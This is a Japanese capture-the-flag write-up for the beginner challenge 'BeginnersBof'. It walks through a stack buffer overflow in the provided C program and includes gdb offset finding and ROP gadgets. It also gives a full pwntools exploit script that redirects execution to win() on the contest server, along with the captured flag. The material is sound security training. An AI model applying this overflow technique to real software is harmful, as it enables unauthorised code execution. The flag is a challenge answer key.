# BeginnersBof

## Description

84 pt, beginner

author:n01e0

Pwnってこういうのだけじゃないらしいですが，多分これだけでもできればすごいと思います．

## writeup

```bash
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=86ef4ca27c36d4407e00eb318b228011ce11ac63, for GNU/Linux 3.2.0, not stripped
$ checksec --file ./chall
[*] '/BeginnersBof/chall'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

タイトルにもある通り、ソースコードからBoFによって`win()`に制御を移せばよいと判断しました。
BUFSIZEが固定帳であることと、`fgets(buf, len, stdin);`から、ここを利用すればよいと思いました。

```c
#define BUFSIZE 0x10

void win() {
    char buf[0x100];
    int fd = open("flag.txt", O_RDONLY);
    if (fd == -1)
        err(1, "Flag file not found...\n");
    write(1, buf, read(fd, buf, sizeof(buf)));
    close(fd);
}
int main() {
    int len = 0;
    char buf[BUFSIZE] = {0};
    puts("How long is your name?");
    scanf("%d", &len);
    char c = getc(stdin);
    if (c != '\n')
        ungetc(c, stdin);
    puts("What's your name?");
    fgets(buf, len, stdin);
    printf("Hello %s", buf);
}
```

次にgdbのpattcでパターンを作り、入力直後のRBPの値を見て、pattoからオフセットを調べました。32バイトです。

```bash
gdb-peda$ pattc 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
...
--stack--
RBP: 0x7ffeb42efa70 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA")
---------
gdb-peda$ patto A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA
A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA found at offset: 32
gdb-peda$ ropgadget
ret = 0x40101a
popret = 0x4011cd
addesp_8 = 0x401017
```

あとは`popret`のアドレスを取得して、以下のようなpayloadを作ればフラグが取れました。

```python
from pwn import *

binfile = "./chall"
context.binary = binfile
# context.log_level = 'debug'
elf = ELF(binfile)

popret = 0x4011cd # by gdb `ropgadget`

win = elf.symbols['win']
log.info('win: %s' % hex(win))

HOST='beginnersbof.quals.beginners.seccon.jp'
PORT=9000
# conn = process(binfile)
conn = remote(HOST, PORT)
log.info("connect to remote server....")

conn.recvuntil('How long is your name?')
# payload = '41' # fail
payload = '100'
log.info("sent payload: %s" % payload)
conn.sendline(payload)

r = conn.recvuntil("What's your name?\n")
log.info(r)
# offset: 32
payload = b"A" * 32
payload += p64(popret)
payload += p64(win)
conn.sendline(payload)

r = conn.recvall()
log.info(r)
conn.interactive()
```


```bash
python3 solver.py
[*] '/BeginnersBof/chall'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './chall'
[*] ret: 0x40101a
[*] win: 0x4011e6
[+] Opening connection to beginnersbof.quals.beginners.seccon.jp on port 9000: Done
[*] connect to remote server....
solver.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil('How long is your name?')
[*] sent payload: 100
solver.py:31: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.sendline(payload)
solver.py:33: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r = conn.recvuntil("What's your name?\n")
/usr/local/lib/python3.8/dist-packages/pwnlib/log.py:395: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*]
    What's your name?
[+] Receiving all data: Done (97B)
[*] Closed connection to beginnersbof.quals.beginners.seccon.jp port 9000
/usr/local/lib/python3.8/dist-packages/pwnlib/log.py:395: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍ\x11ctf4b{Y0u_4r3_4lr34dy_4_BOF_M45t3r!}
    Segmentation fault
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```


## FLAG

```bash
ctf4b{Y0u_4r3_4lr34dy_4_BOF_M45t3r!}
```

## REF

https://ywkw1717.hatenablog.com/entry/2018/10/28/185936
